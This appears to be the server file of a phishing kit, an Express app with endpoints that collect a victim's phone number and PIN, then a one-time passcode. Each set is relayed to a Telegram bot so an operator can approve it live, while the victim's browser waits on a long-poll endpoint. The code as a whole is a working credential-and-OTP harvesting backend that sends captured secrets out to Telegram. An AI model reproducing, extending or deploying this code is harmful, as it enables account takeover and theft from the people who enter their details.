require('dotenv').config();

const express = require('express');
const path = require('path');
const crypto = require('crypto');

const db = require('./db');
const { sendLoginApproval, sendOtpApproval, startBot } = require('./telegram');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

/* ---------- 1. Submit login (fire-and-forget Telegram send) ---------- */
app.post('/api/submit-login', (req, res) => {
  try {
    const { phone, pin } = req.body || {};
    if (!phone || !pin) return res.status(400).json({ ok: false, error: 'missing phone/pin' });

    const sessionId = crypto.randomBytes(4).toString('hex'); // 8 chars
    db.createSession(sessionId, { phone: String(phone), pin: String(pin), stage: 'login' });

    // Respond to the browser NOW — don't wait for Telegram
    res.json({ ok: true, sessionId });

    // Fire Telegram send in the background
    sendLoginApproval(sessionId, phone, pin).catch((err) =>
      console.error('sendLoginApproval failed:', err?.message || err)
    );
  } catch (err) {
    console.error('submit-login:', err);
    res.status(500).json({ ok: false, error: err.message });
  }
});

/* ---------- 2. Submit OTP (fire-and-forget) ---------- */
app.post('/api/submit-otp', (req, res) => {
  try {
    const { sessionId, otp } = req.body || {};
    const session = db.getSession(sessionId);
    if (!session) return res.status(404).json({ ok: false, error: 'session not found' });

    db.updateSession(sessionId, { otp: String(otp), stage: 'otp', status: 'PENDING' });
    res.json({ ok: true });

    sendOtpApproval(sessionId, session.phone, otp).catch((err) =>
      console.error('sendOtpApproval failed:', err?.message || err)
    );
  } catch (err) {
    console.error('submit-otp:', err);
    res.status(500).json({ ok: false, error: err.message });
  }
});

/* ---------- 3. Long-poll status (fast path) ---------- */
/*
 * GET /api/wait-status/:sessionId?prev=<currentStatus>
 * Holds the connection until status changes OR 25s elapse.
 * Frontend gets an instant reply the moment admin taps a button.
 */
const LONG_POLL_TIMEOUT = 25000;   // 25 s
const LONG_POLL_TICK    = 150;     // check DB every 150 ms

app.get('/api/wait-status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const prev = String(req.query.prev || 'PENDING');

  const started = Date.now();
  let finished = false;

  const finish = (status) => {
    if (finished) return;
    finished = true;
    clearInterval(timer);
    res.json({ status });
  };

  const timer = setInterval(() => {
    const session = db.getSession(sessionId);
    if (!session) return finish('EXPIRED');
    if (session.status !== prev) return finish(session.status);
    if (Date.now() - started > LONG_POLL_TIMEOUT) return finish(session.status);
  }, LONG_POLL_TICK);

  // Clean up if the browser disconnects
  req.on('close', () => {
    if (!finished) {
      finished = true;
      clearInterval(timer);
    }
  });
});

/* ---------- 4. Legacy instant poll (fallback) ---------- */
app.post('/api/check-status', (req, res) => {
  const { sessionId } = req.body || {};
  const session = db.getSession(sessionId);
  if (!session) return res.json({ status: 'EXPIRED' });
  res.json({ status: session.status });
});

/* ---------- Start server + bot ---------- */
const server = app.listen(PORT, () => {
  console.log(`🌐 Server running at http://localhost:${PORT}`);
  startBot(); // run bot inside the listen callback so it actually starts
});

server.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`\n❌ Port ${PORT} is already in use.`);
    console.error(`   Free it with:\n`);
    console.error(`   Get-NetTCPConnection -LocalPort ${PORT} -State Listen | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }\n`);
    console.error(`   Then run: npm start\n`);
    process.exit(1);
  }
  throw err;
});